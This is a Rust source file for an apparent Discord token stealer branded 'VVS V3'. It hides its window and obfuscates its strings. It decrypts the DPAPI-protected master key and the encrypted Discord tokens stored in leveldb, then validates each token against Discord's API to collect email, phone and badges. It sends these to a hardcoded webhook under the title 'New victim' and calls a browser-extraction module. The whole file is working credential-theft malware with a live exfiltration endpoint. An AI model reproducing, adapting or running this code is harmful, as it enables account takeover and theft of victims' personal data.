#![windows_subsystem = "windows"]

mod browsers;
mod log;

use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf};
use obfstr::obfstr;
use regex::Regex;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
#[derive(Debug, Serialize, Deserialize)]
struct DdU {
    id: String,
    username: String,
    tag: String,
    avatar: Option<String>,
    public_flags: u64,
    email: String,  
    phone: String   
}

async fn vt(client: &reqwest::Client, token: &str) -> Option<DdU> {
    let res = client.get(obfstr!("https://discord.com/api/v9/users/@me"))
        .header("Authorization", token)
        .send().await.ok()?;

    if res.status().is_success() {
        let json: Value = res.json().await.ok()?;
        let id = json[obfstr!("id")].as_str()?.to_string();
        let username = json[obfstr!("username")].as_str()?.to_string();
        let discrim = json[obfstr!("discriminator")].as_str().unwrap_or(obfstr!("0"));
        let avatar = json[obfstr!("avatar")].as_str().map(|s| s.to_string());
        let public_flags = json[obfstr!("public_flags")].as_u64().unwrap_or(0);
        let email = json[obfstr!("email")].as_str().unwrap_or(obfstr!("N/A")).to_string();
        let phone = json[obfstr!("phone")].as_str().unwrap_or(obfstr!("N/A")).to_string();

        Some(DdU { 
            id, 
            username: username.clone(), 
            tag: format!("{}#{}", username, discrim), 
            avatar,
            public_flags,
            email,
            phone
        })
    } else { None }
}

fn badge_emojis(flags: u64) -> Vec<&'static str> {
    let badges = [
        (1 << 0, obfstr!("<:Badge_Discord_Staff:1365704725646807060>")),
        (1 << 1, obfstr!("<:DiscordPartner:1365700977570742312>")),
        (1 << 2, obfstr!("<:HypeSquadEvents:1365704359454834770>")),
        (1 << 3, obfstr!("<:BugHunter1:1365701008184967278>")),
        (1 << 9, obfstr!("<:86964earlysupporter:1345831325738995848>")),
        (1 << 6, obfstr!("<:Bravery:1365701196697829438>")),
        (1 << 7, obfstr!("<:Brilliance:1365701219602923643>")),
        (1 << 8, obfstr!("<:Balance:1365701235394482328>")),
        (1 << 14, obfstr!("<:BugHunter2:1365701027830960259>")),
        (1 << 16, obfstr!("<:developper:1365704272368500837>")),
        (1 << 17, obfstr!("<:dev:1365704127103107112>")),
        (1 << 18, obfstr!("<:ModeratorProgramsAlumni:1365701046256533525>")),
        (1 << 12, obfstr!("<:NitroClassic:1365701254894419988>")),
        (1 << 13, obfstr!("<:Nitro:1365701270424199680>")),
        (1 << 17, obfstr!("<:ServerBooster:1365701285578037760>"))
    ];

    let mut emojis = Vec::new();
    for (bit, emoji) in badges {
        if flags & bit != 0 {
            emojis.push(emoji);
        }
    }
    emojis
}



fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let key_data = if encrypted_key.starts_with(obfstr!(b"DPAPI")) {
        &encrypted_key[5..]
    } else {
        encrypted_key
    };
    
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: key_data.len() as u32,
            pbData: key_data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
        if CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else { None }
    }
}

fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 { 
        return None; 
    }

    let prefix = &raw_data[0..3]; // No obfuscation needed for byte slices like b"v10"
    let (iv, ciphertext) = match prefix {
        obfstr!(b"v10") | obfstr!(b"v11") | obfstr!(b"v20") => {
            if raw_data.len() < 15 {
                return None;
            }
            (&raw_data[3..15], &raw_data[15..])
        },
        _ => {
            if raw_data.len() < 12 {
                return None;
            }
            (&raw_data[0..12], &raw_data[12..])
        }
    };

    if ciphertext.len() < 16 {
        return None;
    }
    
    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
    
    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);

    cipher.decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
    let roaming = PathBuf::from(env::var("APPDATA").unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert(obfstr!("Discord"), roaming.join(obfstr!("discord")));
    paths.insert(obfstr!("DiscordPTB"), roaming.join(obfstr!("discordptb")));
    paths.insert(obfstr!("DiscordCanary"), roaming.join(obfstr!("discordcanary")));
    paths
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    log::init();
    log::log(obfstr!("=== START ==="));
    browsers::chrome_inject::cleanup_legacy_artifacts();

    let wbh = obfstr!("https://discord.com/api/webhooks/1529195936272613640/QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd");
    let client = reqwest::Client::builder()
        .user_agent(obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"))
        .build()?;
    let mut sent_tokens = HashSet::new();

    let discord_paths = get_discord_paths();

    for (name, path) in discord_paths {
        if !path.exists() {
            log::log(&format!(obfstr!("discord skip (missing): {}"), name));
            continue;
        }
        log::log(&format!(obfstr!("discord scan: {} -> {}"), name, path.display()));
        
        let local_state_path = path.join(obfstr!("Local State"));

        if let Ok(content) = fs::read_to_string(&local_state_path) {
            let json_ls: Value = serde_json::from_str(&content)?;
            if let Some(enc_key) = json_ls[obfstr!("os_crypt")][obfstr!("encrypted_key")].as_str() {
                if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
                    if let Some(master_key) = decrypt_master_key(&bytes[5..]) {
                        
                        let prof_path = path.clone();

                        if !prof_path.exists() { continue; }

                        let db_path = prof_path.join(obfstr!("Local Storage/leveldb"));

                        if db_path.exists() {
                            if let Ok(entries) = fs::read_dir(&db_path) {
                                let re = Regex::new(obfstr!(r#"dQw4w9WgXcQ:[^"]+"#)).unwrap();
                                for entry in entries.flatten() {
                                    if let Ok(file_content) = fs::read(entry.path()) {
                                        let text = String::from_utf8_lossy(&file_content);
                                        for cap in re.captures_iter(&text) {
                                            let b64_part = cap[0].split(obfstr!("dQw4w9WgXcQ:")).nth(1).unwrap_or_default().trim_end_matches(obfstr!("\"")).trim_end_matches(obfstr!("\\"));
                                            if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
                                                if let Some(token) = decrypt_token(&enc_data, &master_key) {
                                                    if sent_tokens.insert(token.clone()) {
                                                        log::log(&format!(obfstr!("discord token found ({})"), name));
                                                        if let Some(user) = vt(&client, &token).await {
                                                            let avatar_url = user.avatar.as_ref().map(|h| format!(obfstr!("https://cdn.discordapp.com/avatars/{}/{}.png"), user.id, h))
                                                                .unwrap_or_else(|| obfstr!("https://cdn.discordapp.com/embed/avatars/0.png").to_string());

                                                            let badges_display = badge_emojis(user.public_flags).join(" ");
                                                            let final_badges = if badges_display.is_empty() { 
                                                                obfstr!("`None`").to_string() 
                                                            } else { 
                                                                badges_display
                                                            };

                                                            let embed = json!({
                                                                obfstr!("embeds"): [{
                                                                    obfstr!("title"): obfstr!("<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>"),
                                                                    obfstr!("color"): 0x7289DA,
                                                                    obfstr!("thumbnail"): { obfstr!("url"): avatar_url },
                                                                    obfstr!("fields"): [
                                                                        { obfstr!("name"): obfstr!("<a:b_diamond:1356277335921262885> Username"), obfstr!("value"): format!(obfstr!("`{}`"), user.tag), obfstr!("inline"): true },
                                                                        { obfstr!("name"): obfstr!("<a:dark_butterfly:1441101545465974935> ID"), obfstr!("value"): format!(obfstr!("`{}`"), user.id), obfstr!("inline"): true },
                                                                        { obfstr!("name"): obfstr!("<a:flecheblanche:1482614586413682730> Source"), obfstr!("value"): name.to_string(), obfstr!("inline"): false },
                                                                        { obfstr!("name"): obfstr!("<a:flecheblanche:1482614586413682730> Token"), obfstr!("value"): format!(obfstr!("```{}```"), token), obfstr!("inline"): false },
                                                                        { obfstr!("name"): obfstr!("<a:all_discord_badges_gif:1157698511320653924> Badges"), obfstr!("value"): final_badges, obfstr!("inline"): false },
                                                                        { obfstr!("name"): obfstr!("<a:dark_butterfly:1441101545465974935> Email"), obfstr!("value"): format!(obfstr!("`{}`"), user.email), obfstr!("inline"): false },
                                                                        { obfstr!("name"): obfstr!("<a:dark_butterfly:1441101545465974935> Phone"), obfstr!("value"): format!(obfstr!("`{}`"), user.phone), obfstr!("inline"): false }
                                                                    ],
                                                                    obfstr!("footer"): { obfstr!("text"): obfstr!("VVS V3") },
                                                                    obfstr!("timestamp"): chrono::Utc::now().to_rfc3339()
                                                                }]
                                                            });
                                                            let response = client.post(wbh).json(&embed).send().await;
                                                            match response {
                                                                Ok(resp) => {
                                                                    log::log(&format!(
                                                                        obfstr!("discord webhook token embed: HTTP {}"),
                                                                        resp.status()
                                                                    ));
                                                                }
                                                                Err(err) => {
                                                                    log::log(&format!(
                                                                        obfstr!("discord webhook token embed ERR: {}"),
                                                                        err
                                                                    ));
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    log::log(&format!(obfstr!("discord tokens sent: {}"), sent_tokens.len()));

    log::log(obfstr!("browser extraction start"));
    match browsers::run(&client, wbh).await {
        Ok(()) => log::log(obfstr!("browser extraction OK")),
        Err(e) => log::log(&format!(obfstr!("browser extraction ERR: {}"), e)),
    }

    log::log(obfstr!("=== DONE ==="));
    Ok(())
}